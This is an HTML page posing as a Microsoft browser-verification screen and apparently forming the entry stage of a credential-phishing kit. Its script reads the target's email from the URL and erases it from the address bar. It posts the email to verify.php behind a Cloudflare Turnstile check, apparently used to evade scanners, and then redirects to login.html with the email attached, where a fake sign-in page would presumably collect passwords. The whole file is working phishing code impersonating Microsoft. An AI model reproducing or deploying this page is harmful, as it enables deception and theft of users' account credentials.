<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Microsoft Verification</title>
  <style>
    html, body {
      height: 100%;
      margin: 0;
      background-color: #1d1d1d;
      color: white;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      text-align: center;
    }

    body {
      padding: 20px;
      box-sizing: border-box;
    }

    .container {
      max-width: 400px;
      width: 100%;
      text-align: center;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      gap: 20px;
    }

    h1 {
      font-weight: 600;
      margin: 0;
      font-size: 24px;
      line-height: 1.4;
      text-align: center;
      white-space: normal;
    }

    #security-msg {
      font-size: 16px;
      color: #ccc;
      margin: 0;
      min-height: 24px;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Checking your browser before accessing Microsoft</h1>
    <p id="security-msg">Verifying you are human. This may take a few seconds...</p>

    <form id="turnstile-form" action="verify.php" method="POST">
      <input type="hidden" name="hash" id="hash-field" />
      <div
        class="cf-turnstile"
        data-sitekey="0x4AAAAAABh8YRnURc-1UUi-"
        data-callback="onCaptchaSuccess"
      ></div>
    </form>
  </div>

  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>

  <script>
    // Animation
    const statusMessages = [
      "Performing browser integrity check...",
      "Validating session security...",
      "Verifying you are human..."
    ];
    const securityMsg = document.getElementById("security-msg");
    statusMessages.forEach((msg, i) => {
      setTimeout(() => {
        securityMsg.textContent = msg;
      }, i * 1300);
    });

    // Extract email from ?email=
    let extractedEmail = null;
    window.addEventListener("DOMContentLoaded", () => {
      const params = new URLSearchParams(window.location.search);
      const emailParam = params.get("email");

      if (emailParam && emailParam.includes("@")) {
        extractedEmail = emailParam.trim();

        // Hide the email from the URL instantly
        history.replaceState({}, document.title, window.location.pathname);
      }

      // Send ?email= into hidden field (if needed)
      document.getElementById("hash-field").value = emailParam || "";
    });

    // CAPTCHA success
    function onCaptchaSuccess() {
      document.getElementById("turnstile-form").submit();
    }

    // Redirect after 4s
    window.onload = function () {
      setTimeout(() => {
        if (extractedEmail) {
          window.location.href = "login.html?u=" + extractedEmail;
        } else {
          window.location.href = "login.html";
        }
      }, 4000);
    };
  </script>
</body>
</html>
